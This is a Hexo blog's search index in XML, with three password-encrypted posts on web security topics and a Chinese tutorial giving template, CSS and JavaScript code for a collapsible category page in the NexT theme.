<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>【计算机网络】Cookie、Session和Token</title>
    <url>/posts/4c5ad660/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Wrong password, please try again.Or you can contact the author to view the blog" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="6de2eca62824e8d2413ff64504f71afaf309dbc8581783f70cf18917bdbfdd1c"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>private</tag>
      </tags>
  </entry>
  <entry>
    <title>【SQL注入】SQL注入基础</title>
    <url>/posts/a4455eb/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Wrong password, please try again.Or you can contact the author to view the blog" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="44e309e271544cf5573e21a6acc80e4c606b26452166a5336b01413b64f3033b"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>private</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息收集】子域名收集</title>
    <url>/posts/f00f82b3/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Wrong password, please try again.Or you can contact the author to view the blog" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="833c8c422c795bb9b5ae609c93266914021fdb196f6a45d0c50ea353278e3389">575a118a515358b9225a7b41efbbfd2a6c42733b34748ab54e04f9222fa7c11d14c69c7b2a14557ae87f4469ae1916a8e5ecb63dd989762abf23783c5bb809e5c9ee192af0bd75b41b194b3da023190750477ed2df4378296a3d6afab8d249071784c692c0842bcac39871803e39c2b2bc3f39ba3c20f35fb9e87e8e64f5c627cd2f667f584e8b3022a2fff24bbab83f4a59a1f49557abca9cd4decf589d00eef4d3978a790f150a78a3ad3a291657b24eddb5c543b8ee00f8fe95950861053c2347d24048f49ae7aa7aa93cce7e56f0a172c1e2560a363fc6a0e384ce472283f676d49744a2ab9f4ba8f6f4b87859a368e7bfdb0e7683b8463b53535724e058bbb0648cb8141475142356e258ff2d9e362d5f88ad32655c0a2a2247c7a026f7a13ac8ebadfbe25f04e8614c029c033437508c62d719e8add5d95f72ea1f9e08c78fd526a8ec3eaa12537f602793923f6fecf8ef7c73787325acb88f8bbe8b9574c65d894a62114cba5be2ac67bebeee2dc22d805e90b15dc6073f67a1bcaa9aa50186443921ef6ff4cfbb60a975b3b7e648540aaa96db7d742375970c9495db5a12ea93dd89ed856eac3930748e2d74c77b8f969f0ded6501b54343a226af6d</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>private</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/posts/0/</url>
    <content><![CDATA[<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
  </entry>
  <entry>
    <title>【Hexo】分类页面展开折叠</title>
    <url>/posts/15e23f74/</url>
    <content><![CDATA[<ul class="lvl-0">
<li class="lvl-2">
<p>原来的分类页面太丑了，并且分类之间看的不是很清楚。于是我就想优化一下，添加新的样式。</p>
</li>
<li class="lvl-2">
<p>添加好了以后，我又觉得如果后期文章增多，页面就会非常杂乱，因此我又优化成了可以展开折叠的页面。</p>
</li>
<li class="lvl-2">
<p>优化成可以展开折叠的页面之后，看到最后一层分类的时候总感觉空荡荡的，总觉得到这样了，不如把所有的文章都直接显示出来得了。</p>
</li>
</ul>
<p>于是便有了这篇文章。</p>
<h2 id="分类折叠功能">分类折叠功能</h2>
<p>在themes\next\layout\page.swig中，找到分类页面，替换成下面的代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% elif page.type === &#x27;categories&#x27; %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;category-all-page&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;category-all-title&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123; _p(&#x27;counter.categories&#x27;, site.categories.length) &#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;category-all&quot;</span> <span class="attr">id</span>=<span class="string">&quot;categoryContainer&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123; list_categories() &#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我的自定义CSS样式在source_data\styles.styl中，在你的自定义样式中添加：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 分类折叠样式 */</span></span><br><span class="line"><span class="selector-class">.category-toggle-icon</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">16px</span>;</span><br><span class="line">  <span class="attribute">margin-right</span>: <span class="number">5px</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.category-list-child</span> &#123;</span><br><span class="line">  <span class="attribute">padding-left</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.category-list-link</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">padding-left</span>: <span class="number">0</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 添加手型光标表示可点击 */</span></span><br><span class="line"><span class="selector-class">.category-list-item</span> &gt; <span class="selector-class">.category-list-link</span> &#123;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 悬停效果 */</span></span><br><span class="line"><span class="selector-class">.category-list-item</span> &gt; <span class="selector-class">.category-list-link</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#f5f5f5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建js文件themes\next\source\js\category-collapse.js：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> container = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;categoryContainer&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!container) <span class="keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 1. 添加折叠图标</span></span><br><span class="line">  container.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.category-list-item&#x27;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> childList = item.<span class="title function_">querySelector</span>(<span class="string">&#x27;ul&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (childList) &#123;</span><br><span class="line">      <span class="keyword">const</span> header = item.<span class="title function_">querySelector</span>(<span class="string">&#x27;.category-list-link&#x27;</span>).<span class="property">parentNode</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 创建折叠图标</span></span><br><span class="line">      <span class="keyword">const</span> icon = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;i&#x27;</span>);</span><br><span class="line">      icon.<span class="property">className</span> = <span class="string">&#x27;fa fa-caret-right category-toggle-icon&#x27;</span>;</span><br><span class="line">      header.<span class="title function_">insertBefore</span>(icon, header.<span class="property">firstChild</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 添加点击事件处理</span></span><br><span class="line">      header.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">target</span>.<span class="property">tagName</span> === <span class="string">&#x27;A&#x27;</span>) &#123;</span><br><span class="line">          e.<span class="title function_">preventDefault</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">const</span> isExpanded = childList.<span class="property">style</span>.<span class="property">display</span> !== <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">        childList.<span class="property">style</span>.<span class="property">display</span> = isExpanded ? <span class="string">&#x27;none&#x27;</span> : <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">        icon.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;fa-caret-right&#x27;</span>, !isExpanded);</span><br><span class="line">        icon.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;fa-caret-down&#x27;</span>, isExpanded);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 2. 初始隐藏所有子分类</span></span><br><span class="line">  container.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.category-list-item ul&#x27;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">ul</span> =&gt;</span> &#123;</span><br><span class="line">    ul.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>记得在themes\next\layout_layout.swig中的<code>&lt;body&gt;</code>前引用：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;&#123; partial(&#x27;_scripts/noscript.swig&#x27;, &#123;&#125;, &#123;cache: theme.cache.enable&#125;) &#125;&#125;</span><br><span class="line">&#123;% if page.type === &#x27;categories&#x27; %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/js/category-collapse.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125; </span><br></pre></td></tr></table></figure>
<p>没错就这么简单。剩下的可以优化一下CSS。</p>
<h2 id="文章折叠展开">文章折叠展开</h2>
<p>终于做好了，肝死我了：</p>
<h3 id="themes-next-layout-page-swig">themes\next\layout\page.swig</h3>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">          &#123;% elif page.type === &#x27;categories&#x27; %&#125;</span><br><span class="line">&lt;--</span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;category-all-page&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;category-all-title&quot;</span>&gt;</span></span><br><span class="line">              &#123;&#123; _p(&#x27;counter.categories&#x27;, site.categories.length) &#125;&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;category-all&quot;</span>&gt;</span></span><br><span class="line">              &#123;&#123; list_categories() &#125;&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">--&gt;</span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;category-all-page&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;category-all-title&quot;</span>&gt;</span></span><br><span class="line">              &#123;&#123; _p(&#x27;counter.categories&#x27;, site.categories.length) &#125;&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;category-container&quot;</span>&gt;</span></span><br><span class="line">              <span class="comment">&lt;!-- 左侧分类树 --&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;category-tree&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;category-all&quot;</span> <span class="attr">id</span>=<span class="string">&quot;categoryContainer&quot;</span>&gt;</span></span><br><span class="line">                  &#123;&#123; list_categories() &#125;&#125;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">              </span><br><span class="line">              <span class="comment">&lt;!-- 右侧文章列表 --&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;categoryPostsContainer&quot;</span> <span class="attr">class</span>=<span class="string">&quot;category-posts-container&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;posts-collapse&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;collection-title&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;collection-header&quot;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;currentCategoryName&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">small</span>&gt;</span>&#123;&#123; __(&#x27;title.category&#x27;) &#125;&#125;<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;categoryPostsList&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="themes-next-source-js-category-collapse-js">themes\next\source\js\category-collapse.js</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> container = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;categoryContainer&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!container) <span class="keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 遍历所有分类项</span></span><br><span class="line">  container.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.category-list-item&#x27;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> link = item.<span class="title function_">querySelector</span>(<span class="string">&#x27;.category-list-link&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> childList = item.<span class="title function_">querySelector</span>(<span class="string">&#x27;ul&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> count = item.<span class="title function_">querySelector</span>(<span class="string">&#x27;.category-list-count&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 移除所有折叠图标（如果有）</span></span><br><span class="line">    <span class="keyword">const</span> existingIcons = item.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.category-toggle-icon&#x27;</span>);</span><br><span class="line">    existingIcons.<span class="title function_">forEach</span>(<span class="function"><span class="params">icon</span> =&gt;</span> icon.<span class="title function_">remove</span>());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果有子分类，添加折叠图标到右侧</span></span><br><span class="line">    <span class="keyword">if</span> (childList) &#123;</span><br><span class="line">      <span class="keyword">const</span> icon = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;i&#x27;</span>);</span><br><span class="line">      icon.<span class="property">className</span> = <span class="string">&#x27;fa fa-caret-down category-toggle-icon&#x27;</span>;</span><br><span class="line">      icon.<span class="property">style</span>.<span class="property">marginLeft</span> = <span class="string">&#x27;5px&#x27;</span>;</span><br><span class="line">      icon.<span class="property">style</span>.<span class="property">cursor</span> = <span class="string">&#x27;pointer&#x27;</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 添加到计数后面</span></span><br><span class="line">      <span class="keyword">if</span> (count) &#123;</span><br><span class="line">        count.<span class="property">parentNode</span>.<span class="title function_">insertBefore</span>(icon, count.<span class="property">nextSibling</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        link.<span class="property">parentNode</span>.<span class="title function_">insertBefore</span>(icon, link.<span class="property">nextSibling</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 初始状态：第一级分类展开，其他级折叠</span></span><br><span class="line">      <span class="keyword">const</span> isTopLevel = item.<span class="property">parentElement</span>.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&#x27;category-list&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (!isTopLevel) &#123;</span><br><span class="line">        childList.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">        icon.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;fa-caret-down&#x27;</span>);</span><br><span class="line">        icon.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;fa-caret-right&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 添加折叠/展开事件</span></span><br><span class="line">      icon.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        e.<span class="title function_">stopPropagation</span>();</span><br><span class="line">        <span class="keyword">const</span> isExpanded = childList.<span class="property">style</span>.<span class="property">display</span> === <span class="string">&#x27;block&#x27;</span> || childList.<span class="property">style</span>.<span class="property">display</span> === <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        childList.<span class="property">style</span>.<span class="property">display</span> = isExpanded ? <span class="string">&#x27;none&#x27;</span> : <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">        icon.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;fa-caret-down&#x27;</span>, !isExpanded);</span><br><span class="line">        icon.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;fa-caret-right&#x27;</span>, isExpanded);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 为分类链接绑定点击事件</span></span><br><span class="line">    <span class="comment">// 在分类链接点击事件中添加展开子分类功能</span></span><br><span class="line">    link.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">      e.<span class="title function_">preventDefault</span>();</span><br><span class="line">      e.<span class="title function_">stopPropagation</span>();</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 获取分类名称和路径</span></span><br><span class="line">      <span class="keyword">const</span> categoryName = link.<span class="property">textContent</span>.<span class="title function_">trim</span>();</span><br><span class="line">      <span class="keyword">const</span> categoryPath = link.<span class="title function_">getAttribute</span>(<span class="string">&#x27;href&#x27;</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 如果有子分类，则切换展开/折叠状态</span></span><br><span class="line">      <span class="keyword">const</span> childList = item.<span class="title function_">querySelector</span>(<span class="string">&#x27;ul&#x27;</span>);</span><br><span class="line">      <span class="keyword">const</span> icon = item.<span class="title function_">querySelector</span>(<span class="string">&#x27;.category-toggle-icon&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (childList &amp;&amp; icon) &#123;</span><br><span class="line">        <span class="comment">// 切换展开/折叠状态</span></span><br><span class="line">        <span class="keyword">const</span> isExpanded = childList.<span class="property">style</span>.<span class="property">display</span> === <span class="string">&#x27;block&#x27;</span> || </span><br><span class="line">                         childList.<span class="property">style</span>.<span class="property">display</span> === <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">        childList.<span class="property">style</span>.<span class="property">display</span> = isExpanded ? <span class="string">&#x27;none&#x27;</span> : <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">        icon.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;fa-caret-down&#x27;</span>, !isExpanded);</span><br><span class="line">        icon.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;fa-caret-right&#x27;</span>, isExpanded);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 显示文章列表</span></span><br><span class="line">      <span class="title function_">loadCategoryPosts</span>(categoryName, categoryPath);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 加载分类文章的函数</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">loadCategoryPosts</span>(<span class="params">categoryName, categoryPath</span>) &#123;</span><br><span class="line">    <span class="comment">// 移除所有激活状态</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.category-list-link&#x27;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">link</span> =&gt;</span> &#123;</span><br><span class="line">      link.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;active-category&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.category-list-item&#x27;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">      item.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;active-ancestor&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 为当前分类添加激活状态</span></span><br><span class="line">    <span class="keyword">const</span> currentLink = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">`.category-list-link[href=&quot;<span class="subst">$&#123;categoryPath&#125;</span>&quot;]`</span>);</span><br><span class="line">    <span class="keyword">if</span> (currentLink) &#123;</span><br><span class="line">      currentLink.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;active-category&#x27;</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 为当前分类的所有父级添加 active-ancestor</span></span><br><span class="line">      <span class="keyword">let</span> parentItem = currentLink.<span class="title function_">closest</span>(<span class="string">&#x27;.category-list-child&#x27;</span>)?.<span class="title function_">closest</span>(<span class="string">&#x27;.category-list-item&#x27;</span>);</span><br><span class="line">      <span class="keyword">while</span> (parentItem) &#123;</span><br><span class="line">        parentItem.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;active-ancestor&#x27;</span>);</span><br><span class="line">        parentItem = parentItem.<span class="title function_">closest</span>(<span class="string">&#x27;.category-list-child&#x27;</span>)?.<span class="title function_">closest</span>(<span class="string">&#x27;.category-list-item&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显示当前分类名称</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;currentCategoryName&#x27;</span>).<span class="property">textContent</span> = categoryName;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 显示文章容器</span></span><br><span class="line">    <span class="keyword">const</span> postsContainer = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;categoryPostsContainer&#x27;</span>);</span><br><span class="line">    postsContainer.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 滚动到分类容器顶部</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.category-container&#x27;</span>).<span class="property">scrollTop</span> = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取文章列表容器</span></span><br><span class="line">    <span class="keyword">const</span> postsList = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;categoryPostsList&#x27;</span>);</span><br><span class="line">    postsList.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;div class=&quot;loading-spinner&quot;&gt;&lt;/div&gt;&lt;p&gt;加载中...&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 发送AJAX请求获取分类文章</span></span><br><span class="line">    <span class="title function_">fetch</span>(categoryPath)</span><br><span class="line">      .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">      .<span class="title function_">then</span>(<span class="function"><span class="params">html</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> parser = <span class="keyword">new</span> <span class="title class_">DOMParser</span>();</span><br><span class="line">        <span class="keyword">const</span> doc = parser.<span class="title function_">parseFromString</span>(html, <span class="string">&#x27;text/html&#x27;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 确保选择正确的容器</span></span><br><span class="line">        <span class="keyword">const</span> postsContainer = doc.<span class="title function_">querySelector</span>(<span class="string">&#x27;.category-posts&#x27;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (postsContainer) &#123;</span><br><span class="line">          postsList.<span class="property">innerHTML</span> = postsContainer.<span class="property">innerHTML</span>;</span><br><span class="line">          </span><br><span class="line">          <span class="comment">// 添加必要的类名</span></span><br><span class="line">          postsList.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.post&#x27;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">post</span> =&gt;</span> &#123;</span><br><span class="line">            post.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;post-collapse-item&#x27;</span>);</span><br><span class="line">          &#125;);</span><br><span class="line">          </span><br><span class="line">          postsList.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.post-title-link&#x27;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">link</span> =&gt;</span> &#123;</span><br><span class="line">            link.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;post-title-link&#x27;</span>);</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          postsList.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;p&gt;该分类下暂无文章&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;加载文章失败:&#x27;</span>, error);</span><br><span class="line">        postsList.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;p&gt;加载文章失败，请稍后再试&lt;/p&gt;&#x27;</span>;</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 在遍历分类项后添加以下代码</span></span><br><span class="line">  <span class="comment">// 折叠除第一个顶级分类外的所有顶级分类</span></span><br><span class="line">  <span class="keyword">const</span> topLevelItems = container.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.category-list &gt; .category-list-item&#x27;</span>);</span><br><span class="line">  topLevelItems.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item, index</span>) =&gt;</span> &#123;</span><br><span class="line">    <span 